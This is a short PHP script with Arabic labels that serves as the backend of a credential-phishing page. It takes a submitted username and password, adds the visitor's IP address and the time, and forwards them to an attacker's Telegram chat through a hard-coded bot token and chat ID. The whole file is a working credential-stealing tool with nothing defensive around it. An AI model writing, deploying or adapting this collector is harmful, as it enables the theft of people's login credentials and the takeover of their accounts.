<?php
// ثوابت البوت
$token = "8450258813:AAHCKf6i3a3QR-4R5k7IpmooXOJv2lX8zRM";
$chat_id = "6840048574";

// استقبال البيانات
$data = json_decode(file_get_contents("php://input"), true);

if($data) {
    $username = $data['username'] ?? 'لا يوجد';
    $password = $data['password'] ?? 'لا يوجد';
    $ip = $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';
    $time = date('Y-m-d H:i:s');
    
    $message = "🔔 *بيانات جديدة* 🔔\n";
    $message .= "👤 *اليوزر:* $username\n";
    $message .= "🔑 *الباسورد:* $password\n";
    $message .= "🌍 *الآي بي:* $ip\n";
    $message .= "⏰ *الوقت:* $time";
    
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=".urlencode($message)."&parse_mode=Markdown");
    
    http_response_code(200);
    echo "OK";
} else {
    http_response_code(400);
    echo "No data";
}
?>
